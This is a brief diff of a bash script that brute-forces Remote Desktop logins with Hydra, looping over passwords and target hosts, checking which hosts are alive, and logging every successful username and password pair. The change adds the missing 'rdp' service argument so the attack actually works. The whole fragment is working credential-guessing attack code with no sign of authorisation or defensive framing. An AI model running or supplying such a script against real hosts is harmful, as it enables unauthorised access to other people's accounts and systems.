@@ -73,7 +73,7 @@ for password in "${passwords[@]}"; do
         # Check if the host is alive (using ping)
         if ping -c 1 -W 1 "$rdp_ip" &> /dev/null; then
             # Run Hydra for each username and password pair, capturing output
-            if sudo hydra -l "$target_name" -p "$password" "$rdp_ip" -t 5 -W 4 | grep -q "login successful"; then
+            if sudo hydra -l "$target_name" -p "$password" "$rdp_ip" rdp -t 5 -W 4 | grep -q "login successful"; then
                 echo "Successful login with $target_name on $rdp_ip using password: $password" >> "$success_log_file"
                 successful_attempts=$((successful_attempts + 1))
             else
